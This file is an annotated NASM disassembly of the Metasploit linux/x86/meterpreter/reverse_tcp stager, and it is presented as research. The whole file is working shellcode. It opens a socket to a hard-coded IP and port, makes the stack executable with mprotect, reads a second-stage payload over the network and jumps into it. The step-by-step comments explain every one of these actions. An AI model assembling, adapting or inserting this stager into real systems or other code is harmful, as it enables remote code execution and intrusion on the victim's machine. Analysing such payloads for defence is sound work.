; Filename: msf-revshell.nasm
; Author: Metasploit
; Analysed by Re4son <re4son [at] whitedome.com.au
; Purpose: Disassembly of msf linux/x86/meterpreter/reverse_tcp
;          for research purpose


global _start           

section .text

_start:

  ; Create socket
  xor    ebx,ebx	; zero out ebx
  mul    ebx		; zero out eax & edx
  push   ebx            ; push IPPROTO = 0
  inc    ebx
  push   ebx            ; push SOCK_STREAM=1
  push   0x2            ; push AF_INET=2
  mov    al,0x66	; store sys_socketcall system call number in al
  mov    ecx,esp	; store pointer to arguments in ecx
  int    0x80           ; invoke system call
  xchg   edi,eax	; store the socket file descriptor in esi

  ; Connect
  pop    ebx		; pop connect sub function number 1 into ebx
  push   0xf64a8c0	; push IP address 192.168.100.15
  push   0x39050002	; push port 1337
  mov    ecx,esp	; store pointer to arguments in ecx
  push   0x66		; store sys_socketcall system call number in al
  pop    eax
  push   eax		; use eax as sizeof(struct sockaddr_in)
  push   ecx		; &serv_addr
  push   edi		; our socket descriptor
  mov    ecx,esp	; store pointer to arguments in ecx
  inc    ebx		; inc sub function call number to 3 for connect
  int    0x80		; invoke system call

  ; Prepare buffer for incomming stage 2 shellcode
  mov    dl,0x7         ; set the permit - read (1), write (2) and execute flags (4) in edx
  mov    ecx,0x1000     ; define the size of the region as 4096 bytes
  mov    ebx,esp        ; define the top of the stack as the start of the region
  shr    ebx,0xc        ; do a little happy dance around the table
  shl    ebx,0xc        ; and again the other way
  mov    al,0x7d        ; move system function call number 125 into al
  int    0x80           ; invoke mprotect system call

  ; retrieve stage 2 shellcode
  pop    ebx                ; store our file descriptor in ebx (pushed during the connect() )
  mov    ecx,esp            ; store pointer to our (nicely prepared) buffer in ecx
  cdq                       ; zero out edx
  mov    dh,0xc             ; set the size to 3072 bytes
  mov    al,0x3             ; move system function call number 3 into al
  int    0x80               ; invoke read system call
  jmp    ecx                ; redirect code execution to the downloaded shellcode